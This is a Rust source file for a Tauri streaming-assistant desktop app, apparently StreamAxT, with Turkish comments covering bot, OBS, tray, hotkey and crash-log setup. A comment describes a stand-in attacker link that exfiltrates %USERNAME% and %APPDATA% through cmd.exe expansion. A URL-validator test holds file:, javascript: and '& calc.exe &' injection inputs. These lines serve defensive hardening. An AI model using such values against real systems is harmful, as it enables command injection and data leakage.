#![recursion_limit = "512"]

#[macro_use]
mod yya_log;
mod close_prompt;
pub mod streamaxt;
pub mod db;
pub mod kick;
pub mod media;
pub mod actions;
pub mod destek;
pub mod disk;
pub mod multistream;
pub mod music;
pub mod obs_client;
pub mod obs_studio;
pub mod hotkeys;
pub mod paths;
pub mod secret_store;
pub mod server;
pub mod settings;
pub mod twitch;
pub mod youtube_chat;
pub mod ytdl;
pub mod commands;
pub mod bot;
pub mod widget_runtime;
pub mod widgets;

#[cfg(windows)]
pub mod audio_brand;
#[cfg(windows)]
pub mod single_instance;
pub mod sistem_araci;

use std::path::PathBuf;
use std::sync::Arc;

use parking_lot::RwLock;
use serde::{Deserialize, Serialize};
use sqlx::SqlitePool;
use tauri::{
  image::Image,
  menu::{Menu, MenuItem},
  tray::{MouseButton, MouseButtonState, TrayIconBuilder, TrayIconEvent},
  AppHandle, Manager, State,
};
use tokio::sync::broadcast;

use settings::{AppSettings, ScreenKind};

pub const DEFAULT_PORT: u16 = 8843;

#[derive(Clone)]
pub struct AppState {
  /// dist / assets (kaynak kökü)
  pub root: PathBuf,
  /// SQLite, ayarlar, medya, OAuth (yazılabilir)
  pub data_dir: PathBuf,
  pub portable: bool,
  pub port: u16,
  pub settings: Arc<RwLock<AppSettings>>,
  pub music: Arc<music::MusicState>,
  pub ytdl: Arc<ytdl::YtdlState>,
  pub kick_auth: Arc<kick::KickAuth>,
  pub kick_session: Arc<kick::KickBotSession>,
  pub kick_chat: Arc<bot::kick_chat::KickChatRuntime>,
  pub obs: Arc<obs_client::ObsClientState>,
  /// Çoklu yayın yönlendiricisi (tek kodlama → çok hedef)
  pub multistream: Arc<multistream::Router>,
  /// Yerel yayın çekirdeği (libobs, ayrı süreç) köprüsü
  pub widget_rt: Arc<widget_runtime::WidgetRuntime>,
  pub emote_combo: Arc<widgets::ComboMemory>,
  pub bot_activity: bot::activity::BotActivityLog,
  pub tx: broadcast::Sender<String>,
  pub db: SqlitePool,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct OverlayUrls {
  pub starting: String,
  pub ending: String,
  pub brb: String,
  pub chat: String,
  pub resonance: String,
  pub resonance_overlay: String,
  pub music: String,
}

impl AppState {
  /// Verilen kök ve port için hazır durum üretir.
  ///
  /// Alanları dışarıdan tek tek kurmak, entegrasyon testinin `RwLock`/`Sender`
  /// tiplerini kendi adlandırmasını gerektiriyordu; kütüphane iki kez derlendiği
  /// için bu tipler "farklı" sayılıp derleme kırılıyordu. Kurulum tek yerde.
  pub fn new(root: PathBuf, data_dir: PathBuf, portable: bool, port: u16) -> Self {
    let settings = AppSettings::load(&data_dir);
    let (tx, _) = broadcast::channel::<String>(256);
    // sqlx SqlitePool Tokio context ister — lazy pool Drop’u da runtime’sız panikler.
    let kick_session = Arc::new(kick::KickBotSession::new(&data_dir));
    let db = tauri::async_runtime::block_on(async {
      let pool = match db::open_connected(&data_dir).await {
        Ok(p) => p,
        Err(e) => {
          yya_warn!("SQLite açılamadı ({e:#}); bellek DB");
          sqlx::sqlite::SqlitePoolOptions::new()
            .connect("sqlite::memory:")
            .await
            .expect("memory sqlite")
        }
      };
      // Migrasyon + boş DB seed — HTTP ayağa kalkmadan ÖNCE (production race yok)
      if let Err(e) = db::init(&pool, &settings).await {
        yya_warn!("DB init uyarısı: {e:#}");
      }
      if let Err(e) = kick_session.hydrate_from_db(&pool).await {
        yya_warn!("Kick bot_auth yükleme uyarısı: {e:#}");
      }
      // Açılışta kayıtlı çerez varsa XSRF’i sessizce tamamla → tekrar giriş gerekmesin
      {
        let st = kick_session.status();
        let has_c = st.get("hasCookies").and_then(|v| v.as_bool()).unwrap_or(false);
        let ready = st.get("ready").and_then(|v| v.as_bool()).unwrap_or(false);
        if has_c && !ready {
          match kick_session.fetch_missing_xsrf().await {
            Ok(_) => {
              if let Err(e) = kick_session.persist_to_db(&pool).await {
                yya_warn!("Kick XSRF persist uyarısı: {e:#}");
              } else {
                yya_log!("[kick-session] açılış XSRF tamamlandı");
              }
            }
            Err(e) => yya_warn!("[kick-session] açılış XSRF: {e:#}"),
          }
        } else if ready {
          yya_log!("[kick-session] kayıtlı bot oturumu hazır");
        }
      }
      match db::botaxt_api::seed_alerts_if_empty(&pool, &settings).await {
        Ok(n) if n > 0 => yya_log!("Botaxt alerts seed (init): {n}"),
        Err(e) => yya_warn!("alerts seed uyarısı: {e:#}"),
        _ => {}
      }
      match db::botaxt_api::seed_widgets_if_empty(&pool).await {
        Ok(n) if n > 0 => yya_log!("Botaxt widgets seed (init): {n}"),
        Err(e) => yya_warn!("widgets seed uyarısı: {e:#}"),
        _ => {}
      }
      pool
    });
    let multistream = Arc::new(multistream::Router::new(tx.clone(), Arc::new(multistream::KeyringStore)));
    multistream.set_ffmpeg(ytdl::ffmpeg_yolu(&data_dir));
    multistream.load(multistream::config::parse_list(
      settings.get(ScreenKind::Panel).get("multistream").unwrap_or(&serde_json::Value::Null),
    ));
    Self {
      multistream,
      music: Arc::new(music::MusicState::new(&data_dir)),
      ytdl: Arc::new(ytdl::YtdlState::new()),
      kick_auth: Arc::new(kick::KickAuth::new(&data_dir)),
      kick_session,
      kick_chat: Arc::new(bot::kick_chat::KickChatRuntime::new()),
      obs: Arc::new(obs_client::ObsClientState::new()),
      widget_rt: Arc::new(widget_runtime::WidgetRuntime::new()),
      emote_combo: Arc::new(widgets::ComboMemory::new()),
      bot_activity: bot::activity::BotActivityLog::new(),
      settings: Arc::new(RwLock::new(settings)),
      root,
      data_dir,
      portable,
      port,
      tx,
      db,
    }
  }

  pub fn base_url(&self) -> String {
    format!("http://127.0.0.1:{}", self.port)
  }

  pub fn overlay_urls(&self) -> OverlayUrls {
    let b = self.base_url();
    OverlayUrls {
      starting: format!("{b}/#/starting?obs=1"),
      ending: format!("{b}/#/ending?obs=1"),
      brb: format!("{b}/#/brb?obs=1"),
      chat: format!("{b}/#/chat?obs=1"),
      resonance: format!("{b}/resonance/"),
      resonance_overlay: format!("{b}/resonance/overlay"),
      music: format!("{b}/resonance/dashboard/widgets/pulse"),
    }
  }

  pub fn broadcast_json(&self, value: &serde_json::Value) {
    let _ = self.tx.send(value.to_string());
  }
}

#[tauri::command]
async fn fetch_kick_chatroom(slug: String) -> Result<serde_json::Value, String> {
  kick::fetch_chatroom(&slug).await.map_err(|e| e.to_string())
}

/// 16-32 px'e küçülen tepsi simgesi. `icons/icon.png` (1024 px) doğrudan
/// verildiğinde ince neon halkalar kayboluyordu; bu kopya `scripts/ikon-uret.py`
/// tarafından 64 px'e indirilip keskinleştiriliyor.
const TRAY_ICON_PNG: &[u8] = include_bytes!("../icons/tray.png");

fn setup_tray(app: &AppHandle) -> tauri::Result<()> {
  let show = MenuItem::with_id(app, "show", "Göster", true, None::<&str>)?;
  let settings = MenuItem::with_id(app, "settings", "Ayarlar", true, None::<&str>)?;
  let hide = MenuItem::with_id(app, "hide", "Tepsiye Küçült", true, None::<&str>)?;
  let quit = MenuItem::with_id(app, "quit", "Çıkış", true, None::<&str>)?;
  let menu = Menu::with_items(app, &[&show, &settings, &hide, &quit])?;

  // Simge **açıkça** verilmeli. Eskiden `tauri.conf.json > app.trayIcon`
  // vardı ve Tauri ondan "main" kimliğiyle kendi tepsisini kuruyordu; buradaki
  // ikinci tepsi ise simgesiz kalıyordu. Sonuç: biri boş, diğeri menüsüz iki
  // kayıt — Windows bildirim alanında hiçbir şey görünmüyordu. Yapılandırma
  // girdisi kaldırıldı, tepsi tek yerden ve simgesiyle kuruluyor.
  let icon = Image::from_bytes(TRAY_ICON_PNG)
    .or_else(|_| app.default_window_icon().cloned().ok_or(tauri::Error::AssetNotFound(
      "tray icon".into(),
    )))?;

  let _ = TrayIconBuilder::with_id("main")
    .icon(icon)
    .menu(&menu)
    // Windows'ta sol tık pencereyi getirsin, menü sağ tıkta açılsın.
    .show_menu_on_left_click(false)
    .tooltip("StreamAxT — arka planda çalışıyor")
    .on_menu_event(|app, event| match event.id.as_ref() {
      "quit" => {
        // Axum + tüm tokio görevlerini zorla sonlandır (app.exit asılı kalabiliyor)
        yya_log!("[tray] Çıkış — process::exit(0)");
        streamaxt::shutdown();
        std::process::exit(0);
      }
      "show" => {
        if let Some(w) = app.get_webview_window("main") {
          let _ = w.unminimize();
          let _ = w.show();
          let _ = w.set_focus();
        }
      }
      "settings" => {
        if let Some(w) = app.get_webview_window("main") {
          let _ = w.unminimize();
          let _ = w.show();
          let _ = w.set_focus();
          let url = format!("http://127.0.0.1:{DEFAULT_PORT}/#/panel?nav=settings");
          if let Ok(parsed) = url.parse() {
            let _ = w.navigate(parsed);
          }
        }
      }
      "hide" => {
        if let Some(w) = app.get_webview_window("main") {
          // Gerçek tepsi: pencereyi gizle — bot/HTTP/WS çalışmaya devam eder.
          let _ = w.hide();
        }
      }
      _ => {}
    })
    .on_tray_icon_event(|tray, event| {
      if let TrayIconEvent::Click {
        button: MouseButton::Left,
        button_state: MouseButtonState::Up,
        ..
      } = event
      {
        let app = tray.app_handle();
        if let Some(w) = app.get_webview_window("main") {
          let _ = w.unminimize();
          let _ = w.show();
          let _ = w.set_focus();
        }
      }
    })
    .build(app)?;
  Ok(())
}

/// Yalnızca http(s) adreslerine izin ver — bu komut arayüzden çağrılıyor ve
/// kabuğa gidiyor; `file:`/`javascript:` gibi şemalar buradan geçmemeli.
fn is_safe_web_url(url: &str) -> bool {
  if url.len() > 4096 {
    return false;
  }
  if url.chars().any(|c| c.is_control() || c == '"') {
    return false;
  }
  let lower = url.to_ascii_lowercase();
  lower.starts_with("http://") || lower.starts_with("https://")
}

/// Adresi Windows kabuğuyla (ShellExecuteW) varsayılan tarayıcıda açar.
///
/// Eskiden `cmd /C start "" "<url>"` kullanılıyordu. cmd.exe `%DEĞİŞKEN%`
/// kalıplarını tırnak içinde bile genişletir: sohbette paylaşılan
/// `https://kotu.example/?u=%USERNAME%&p=%APPDATA%` gibi bir bağlantıya
/// tıklanınca kullanıcı adı ve klasör yolları saldırganın sunucusuna
/// gidiyordu. ShellExecute kabuk ayrıştırması yapmaz (`&` de bölünmez) ve
/// SEE_MASK_DOENVSUBST verilmedikçe ortam değişkeni genişletmez.
#[cfg(target_os = "windows")]
fn shell_open(url: &str) -> Result<(), String> {
  use windows::core::{w, HSTRING, PCWSTR};
  use windows::Win32::System::Com::{
    CoInitializeEx, CoUninitialize, COINIT_APARTMENTTHREADED, COINIT_DISABLE_OLE1DDE,
  };
  use windows::Win32::UI::Shell::ShellExecuteW;
  use windows::Win32::UI::WindowsAndMessaging::SW_SHOWNORMAL;

  let url = url.to_string();
  // ShellExecute bazı işleyicileri COM ile çağırır; belgelerin önerdiği gibi
  // STA başlatılmış ayrı bir iş parçacığında çalıştırılır.
  std::thread::spawn(move || unsafe {
    let com = CoInitializeEx(None, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    let hedef = HSTRING::from(url.as_str());
    let sonuc = ShellExecuteW(None, w!("open"), &hedef, PCWSTR::null(), PCWSTR::null(), SW_SHOWNORMAL);
    if com.is_ok() {
      CoUninitialize();
    }
    // 32'den büyük değer başarı demektir (Win32 sözleşmesi).
    let kod = sonuc.0 as isize;
    if kod > 32 {
      Ok(())
    } else {
      Err(format!("ShellExecute hata kodu {kod}"))
    }
  })
  .join()
  .map_err(|_| "Tarayıcı açma iş parçacığı çöktü".to_string())?
}

/// Adresi sistem tarayıcısında açar.
///
/// Hem Tauri komutu hem yerel HTTP ucu bunu çağırır: Resonance panel içinde
/// iframe'de çalışıyor ve `window.open` WebView2 tarafından sessizce
/// engellenebiliyor — o yüzden açma işini her koşulda host yapıyor.
pub fn open_external_url(url: &str) -> Result<(), String> {
  let url = url.trim();
  if url.is_empty() {
    return Err("URL boş".into());
  }
  if !is_safe_web_url(url) {
    return Err("Yalnızca http/https adresleri açılabilir".into());
  }

  #[cfg(target_os = "windows")]
  {
    shell_open(url).map_err(|e| format!("Tarayıcı açılamadı: {e}"))
  }
  #[cfg(not(target_os = "windows"))]
  {
    std::process::Command::new("xdg-open")
      .arg(url)
      .spawn()
      .map_err(|e| e.to_string())?;
    Ok(())
  }
}

#[tauri::command]
fn open_in_browser(url: String) -> Result<(), String> {
  open_external_url(&url)
}

/// OBS Studio sürecini başlatır. Zaten çalışıyorsa `"already"`.
#[tauri::command]
fn launch_obs(path: Option<String>) -> Result<String, String> {
  obs_studio::baslat(path.as_deref()).map(str::to_string)
}

#[cfg(test)]
mod tls_tests {
  /// Regresyon: Kick/Twitch wss:// bağlantısı rustls istemci yapılandırması kurar; sağlayıcı yoksa bu panikler ve
  /// `panic = "abort"` ile uygulama açılışta kapanır.
  #[test]
  fn wss_istemcisi_icin_kripto_saglayicisi_var() {
    super::tls_saglayicisini_kur();
    super::tls_saglayicisini_kur();
    assert!(rustls::crypto::CryptoProvider::get_default().is_some());
    let _ = rustls::ClientConfig::builder()
      .with_root_certificates(rustls::RootCertStore::empty())
      .with_no_client_auth();
  }

  /// Botun kullandığı yol: TCP bağlantısı kurulur, ardından tokio-tungstenite rustls yapılandırması oluşturur. Yerel
  /// dinleyici el sıkışmayı hemen keser → hata dönmeli, panik olmamalı (dış ağa çıkılmaz).
  #[tokio::test]
  async fn wss_baglantisi_panik_yerine_hata_doner() {
    super::tls_saglayicisini_kur();
    let dinleyici = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = dinleyici.local_addr().unwrap().port();
    let kabul = tokio::spawn(async move {
      if let Ok((soket, _)) = dinleyici.accept().await {
        drop(soket);
      }
    });
    let sonuc = tokio_tungstenite::connect_async(format!("wss://127.0.0.1:{port}/")).await;
    assert!(sonuc.is_err());
    let _ = kabul.await;
  }
}

#[cfg(test)]
mod open_in_browser_tests {
  use super::*;

  #[test]
  fn only_http_urls_pass() {
    assert!(is_safe_web_url("http://127.0.0.1:8843/x"));
    assert!(is_safe_web_url("https://accounts.spotify.com/authorize?a=1&b=2"));
    assert!(!is_safe_web_url("file:///C:/Windows/System32/calc.exe"));
    assert!(!is_safe_web_url("javascript:alert(1)"));
    assert!(!is_safe_web_url(""));
    // Tırnak ve kontrol karakteri komut satırından kaçamamalı
    assert!(!is_safe_web_url("https://x/\" & calc.exe & \""));
    assert!(!is_safe_web_url("https://x/\na"));
  }

}

/// Spotify bağlıysa yoklar; YTMD Resonance köprüsünden gelir. Çalan kaynak
/// otomatik seçilir, böylece OBS overlay hangisi çalıyorsa onu gösterir.
async fn music_poll_loop(state: AppState) {
  let mut last = String::new();
  // Spotify 429 verirse `Retry-After` dolana kadar istek atılmaz.
  let mut pause_until: Option<std::time::Instant> = None;
  loop {
    let playing = state
      .music
      .now_playing()
      .map(|n| n.is_playing)
      .unwrap_or(false);
    tokio::time::sleep(music::spotify_poll_delay(playing)).await;

    let paused = pause_until.map(|t| std::time::Instant::now() < t).unwrap_or(false);
    if !paused && state.music.spotify_connected() {
      pause_until = None;
      match state.music.poll_spotify().await {
        Ok(np) => {
          state.music.set_note(None);
          state.music.ingest_now(np, "spotify");
        }
        Err(e) => {
          // Son bilinen parça korunur; yalnız not yazılır.
          if let Some(rl) = e.downcast_ref::<music::SpotifyRateLimited>() {
            pause_until = Some(
              std::time::Instant::now() + std::time::Duration::from_secs(rl.pause_secs()),
            );
          }
          state.music.set_note(Some(e.to_string()));
        }
      }
    }
    let payload = serde_json::json!({
      "type": "now-playing",
      "data": state.music.now_playing(),
    });
    let key = state
      .music
      .now_playing()
      .map(|n| format!("{}|{}|{}|{}", n.source, n.title, n.artist, n.is_playing))
      .unwrap_or_default();
    if key != last {
      last = key;
      state.broadcast_json(&payload);
    }
  }
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
/// WebView2'ye (Chromium) verilecek başlangıç bayrakları.
///
/// Ölçüm: Rust süreci ~37 MB, geri kalan ~700 MB tamamen WebView2 süreçleri.
/// Kazanç oradan çıkıyor:
///  * `renderer-process-limit` — panel ve gömülü Resonance ayrı ayrı renderer
///    açıyordu; tek işlemde toplanınca süreç başına sabit maliyet bir kez ödenir.
///  * `max-old-space-size` — V8 varsayılan olarak sistem RAM'ine göre çok
///    geniş bir yığın ayırıyor; bu arayüz için 192 MB fazlasıyla yeter.
///  * Arka plan ağ/senkron servisleri yerel bir araç için tamamen gereksiz.
///
/// Bayraklar WebView2 oluşturulmadan ÖNCE ortam değişkeninde olmalı.
fn configure_webview_memory() {
  // Not: Kick login / Cloudflare için renderer-process-limit=1 ve
  // disable-background-networking kırıcıydı — kaldırıldı. Heap biraz yükseltildi.
  const ARGS: &str = concat!(
    "--js-flags=--max-old-space-size=512 ",
    "--disable-sync ",
    // Tepsiye alınca WebView2 betiği dondurmasın — aksi halde JS kısayol
    // geri çağrıları ölüyor. (Asıl kısayol artık Rust'ta; bu yedek.)
    "--disable-renderer-backgrounding ",
    "--disable-backgrounding-occluded-windows ",
    "--disable-background-timer-throttling ",
    "--disable-features=msWebOOUI,msPdfOOUI ",
    "--no-first-run"
  );
  // Kullanıcı kendi ayarını verdiyse ona dokunma.
  if std::env::var_os("WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS").is_none() {
    std::env::set_var("WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS", ARGS);
  }
}

/// rustls için süreç geneli kripto sağlayıcısını (ring) kurar. Bağımlılık ağacında hiçbir paket sağlayıcı özelliği
/// açmadığında rustls ilk TLS bağlantısında (Kick/Twitch wss://) panikler; `panic = "abort"` ile bu, uygulamanın
/// açılır açılmaz kapanması demekti. İkinci çağrı zararsızdır (zaten kurulu sağlayıcı korunur).
pub fn tls_saglayicisini_kur() {
  let _ = rustls::crypto::ring::default_provider().install_default();
}

/// Çökme günlüğü: `panic = "abort"` altında panik mesajı pencereli uygulamada hiçbir yere yazılmıyordu. Mesaj, konum
/// ve iş parçacığı adı `<veri>/cokme-gunlugu.log` dosyasına eklenir (belirtece benzeyen sözcükler ve RTMP yolları
/// gizlenir; dosya 256 KB'ı aşınca baştan başlar), ardından varsayılan kanca çalışır.
pub fn panik_kaydini_kur(data_dir: &std::path::Path) {
  let yol = data_dir.join("cokme-gunlugu.log");
  let onceki = std::panic::take_hook();
  std::panic::set_hook(Box::new(move |bilgi| {
    let mesaj = bilgi
      .payload()
      .downcast_ref::<&str>()
      .map(|s| s.to_string())
      .or_else(|| bilgi.payload().downcast_ref::<String>().cloned())
      .unwrap_or_else(|| "(metin olmayan panik)".into());
    let mesaj: String = destek::Gizleyici::new(Vec::new(), None).metin(&mesaj).chars().take(2000).collect();
    let konum = bilgi.location().map(|l| format!("{}:{}:{}", l.file(), l.line(), l.column())).unwrap_or_default();
    let is_parcacigi = std::thread::current().name().unwrap_or("?").to_string();
    let satir = format!(
      "{} sürüm={} iş={is_parcacigi} konum={konum} panik: {mesaj}\n",
      chrono::Local::now().format("%Y-%m-%d %H:%M:%S%.3f"),
      env!("CARGO_PKG_VERSION"),
    );
    let buyuk = std::fs::metadata(&yol).map(|m| m.len() > 256 * 1024).unwrap_or(false);
    let dosya = std::fs::OpenOptions::new().create(true).write(true).append(!buyuk).truncate(buyuk).open(&yol);
    if let Ok(mut f) = dosya {
      use std::io::Write;
      let _ = f.write_all(satir.as_bytes());
    }
    onceki(bilgi);
  }));
}

pub fn run() {
  configure_webview_memory();
  tls_saglayicisini_kur();

  #[cfg(windows)]
  {
    // İkinci örnek port 8843'ü alamaz → HTTP ölür, uygulama "açılmaz".
    if !single_instance::claim() {
      return;
    }
    // WebView ayağa kalktıktan sonra etiketle (ayrı thread, gecikmeli).
    audio_brand::start("StreamAxT", None);
  }

  let mut root = std::env::current_exe()
    .ok()
    .and_then(|p| p.parent().map(|d| d.to_path_buf()))
    .unwrap_or_else(|| std::env::current_dir().unwrap_or_else(|_| PathBuf::from(".")));
  // Dev: exe target/.../debug → proje köküne çık
  if root.ends_with("debug") || root.ends_with("release") {
    if let Some(proj) = root
      .ancestors()
      .find(|p| p.join("package.json").exists() || p.join("dist").join("index.html").exists())
    {
      root = proj.to_path_buf();
    }
  }
  // Kurulum / portable: dist exe yanında veya resources altında
  if !root.join("dist").join("index.html").exists() {
    let alt = root.join("resources").join("dist");
    if alt.join("index.html").exists() {
      // server dist path = resources/dist → root'u resources yap
      root = root.join("resources");
    }
  }
  let resolved = paths::resolve(root);
  let _ = std::fs::create_dir_all(&resolved.data_dir);
  panik_kaydini_kur(&resolved.data_dir);
  let state = AppState::new(
    resolved.resource_root,
    resolved.data_dir,
    resolved.portable,
    DEFAULT_PORT,
  );

  let state_for_server = state.clone();
  tauri::async_runtime::spawn(async move {
    if let Err(e) = server::serve(state_for_server).await {
      yya_warn!("HTTP server error: {e}");
    }
  });

  let state_for_music = state.clone();
  tauri::async_runtime::spawn(async move {
    music_poll_loop(state_for_music).await;
  });

  // Kick/Twitch dinleyici + komut motoru + loyalty tick
  bot::spawn_bot_runtime(state.clone());

  let hub = std::sync::Arc::new(hotkeys::HotkeyHub::new());
  let hub_for_plugin = hub.clone();

  tauri::Builder::default()
    .plugin(tauri_plugin_dialog::init())
    // Sahne kısayolları işletim sistemi düzeyinde: tepsiye alınca da çalışsın.
    // Handler Rust'ta — WebView donunca JS geri çağrısı ölmesin diye.
    .plugin(hotkeys::build_plugin(hub_for_plugin).build())
    .manage(state)
    .manage(hub)
    .on_window_event(|window, event| {
      // X → ana panelde sor (tepsiye küçült / kapat / vazgeç). Kick login gerçekten
      // kapanmalı (aksi halde gizli webview Kick sesini çalmaya devam eder + etiket çakışır).
      if let tauri::WindowEvent::CloseRequested { api, .. } = event {
        if window.label() == "main" {
          api.prevent_close();
          close_prompt::request(window.app_handle());
        }
      }
    })
    .setup(|app| {
      setup_tray(app.handle())?;
      close_prompt::install(app.handle());
      streamaxt::autostart();
      // OBS'e uygulama açılınca kendiliğinden bağlan (arayüzü beklemeden).
      tauri::async_runtime::spawn(obs_client::autoconnect_loop(app.handle().clone()));
      // Panel UI'yi gömülü asset yerine yerel HTTP sunucusundan yükle.
      // Böylece `dist/` güncellemesi exe yeniden derlenmeden görünür
      // (sahne kısayolu ekle vb. portable'da kaybolmuyordu).
      let handle = app.handle().clone();
      let port = DEFAULT_PORT;
      tauri::async_runtime::spawn(async move {
        let url = format!("http://127.0.0.1:{port}/");
        for _ in 0..80 {
          if reqwest::Client::new()
            .get(format!("{url}api/server"))
            .send()
            .await
            .map(|r| r.status().is_success())
            .unwrap_or(false)
          {
            break;
          }
          tokio::time::sleep(std::time::Duration::from_millis(100)).await;
        }
        if let Some(w) = handle.get_webview_window("main") {
          if let Ok(parsed) = url.parse() {
            let _ = w.navigate(parsed);
          }
        }
      });
      Ok(())
    })
    .invoke_handler(tauri::generate_handler![
      fetch_kick_chatroom,
      commands::media_playable_urls,
      commands::alerts_list,
      commands::alert_variants_list,
      open_in_browser,
      launch_obs,
      sync_global_hotkeys,
      streamaxt::streamaxt_status,
      streamaxt::streamaxt_start,
      streamaxt::streamaxt_stop,
      kick::login_window::open_kick_login_in_browser,
      kick::login_window::import_kick_session_from_browser,
      kick::login_window::harvest_kick_bot_cookies,
      kick::login_window::kick_bot_session_status,
      obs_client::connect_obs,
      obs_client::obs_get_status,
      obs_client::obs_disconnect,
      obs_client::obs_get_scenes,
      obs_client::obs_set_scene,
      obs_client::obs_get_sources,
      obs_client::obs_toggle_source,
      obs_client::obs_get_inputs,
      obs_client::obs_toggle_mute,
      obs_client::obs_toggle_stream,
      obs_client::obs_start_stream_sequence,
      obs_client::obs_stop_stream_sequence,
      obs_client::obs_cancel_sequence,
    ])
    .build(tauri::generate_context!())
    .expect("error while running tauri application")
    .run(|_app, _event| {});
}

#[tauri::command]
fn sync_global_hotkeys(
  app: AppHandle,
  hub: State<'_, std::sync::Arc<hotkeys::HotkeyHub>>,
  bindings: Vec<hotkeys::HotkeyBindingIn>,
) -> Result<hotkeys::HotkeySyncResult, String> {
  hotkeys::sync_bindings(&app, &hub, bindings)
}
